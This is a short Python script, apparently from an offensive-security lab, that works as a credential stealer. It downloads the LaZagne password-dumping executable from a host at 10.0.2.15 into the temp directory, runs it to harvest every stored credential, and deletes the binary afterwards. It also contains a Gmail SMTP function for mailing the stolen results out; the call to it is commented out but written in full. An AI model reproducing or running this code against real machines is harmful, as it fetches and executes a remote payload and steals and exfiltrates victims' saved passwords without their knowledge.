#!/usr/bin/env python
import requests
import smtplib
import subprocess
import os
import tempfile


def send_mail(email, password, message):
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb', ) as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
print(temp_directory)
os.chdir(temp_directory)
download('http://10.0.2.15/evil_files/lazagne.exe')
result = subprocess.check_output('lazagne.exe all', shell=True)
print(result)
# send_mail('', '', result)
os.remove('lazagne.exe')
